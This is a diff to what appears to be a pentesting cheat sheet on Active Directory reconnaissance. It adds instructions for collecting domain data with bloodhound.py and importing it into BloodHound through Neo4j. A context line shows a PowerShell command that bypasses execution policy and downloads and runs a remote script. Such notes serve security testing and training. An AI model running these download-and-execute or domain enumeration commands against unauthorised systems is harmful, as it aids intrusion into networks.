@@ -20,7 +20,21 @@ powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString(‘
 ```
 {: .nolineno }
 
-If it's possible, execute SharpHound. On Linux, you can use the python version. More information here : <https://github.com/BloodHoundAD/SharpHound> and <https://github.com/fox-it/BloodHound.py>.
+If it's possible, execute SharpHound. Otherwise, on Linux, you can use the python version, remotely. More information here : <https://github.com/BloodHoundAD/SharpHound> and <https://github.com/fox-it/BloodHound.py>.
+
+```bash
+python3 bloodhound.py -u 'XXX' -dc 'DOMAIN' -c all
+```
+{: .nolineno }
+
+The tool gives you a .zip file, that you have to send to a Neo4j database. On Linux, install Neo4j and start the service :
+
+```bash
+sudo neo4j start
+```
+{: .nolineno }
+
+Then execute BloodHound and import the zip file.
 
 ## Lists
 
